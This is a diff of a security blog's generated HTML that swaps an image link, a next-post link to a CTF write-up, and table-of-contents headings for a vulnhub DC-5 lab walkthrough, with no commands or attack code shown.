-      <img class="lazyload lazyload placeholder" src="https://pic2.zhimg.com/80/v2-29e78b52051ce542adf6d786d61fbd19_1440w.webp" class="lazyload placeholder" data-srcset="https://pic2.zhimg.com/80/v2-29e78b52051ce542adf6d786d61fbd19_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="https://picx.zhimg.com/80/v2-9c50d3af0bc62a0e8b6e89e24c769317_1440w.webp" class="lazyload placeholder" data-srcset="https://picx.zhimg.com/80/v2-9c50d3af0bc62a0e8b6e89e24c769317_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
     </div>
-    <a href="/2023/01/23/ctfshow-web-ru-men-bao-po/" class="post-nav-link">
+    <a href="/2023/06/27/yu-ren-bei-wp/" class="post-nav-link">
       <div class="title">
         Next: <i class="fas fa-angle-right"></i>
-        <div class="title-text">ctfshow-web入门-爆破</div>
+        <div class="title-text">愚人杯wp</div>
       </div>
       <!-- <div class="content">
-        靶场&#x2F;来源: ctfshow
-web21
-题目：
-题目提供了一个密码字典，下载即可
+        愚人杯热身赛：有点坑，刚开始时脑子真没反应过来
 
-解题过程：
-分析抓包，发
+flag就是“一个不能说的密码”，绝了，我还以为flag是“群主喜欢3
       </div> -->
     </a>
   </div>
@@ -840,7 +908,7 @@ web21
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web5"><span class="toc-text">web5</span></a></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub-DC-5"><span class="toc-text">vulnhub-DC-5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%8F%91%E7%8E%B0%E4%B8%BB%E6%9C%BA"><span class="toc-text">第一步：发现主机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8nmap%E8%BF%9B%E8%A1%8C%E7%BD%91%E6%AE%B5%E6%89%AB%E6%8F%8F%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">方式一：使用nmap进行网段扫描和端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8fscan"><span class="toc-text">方式二：使用fscan</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web%E6%89%93%E7%82%B9"><span class="toc-text">web打点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
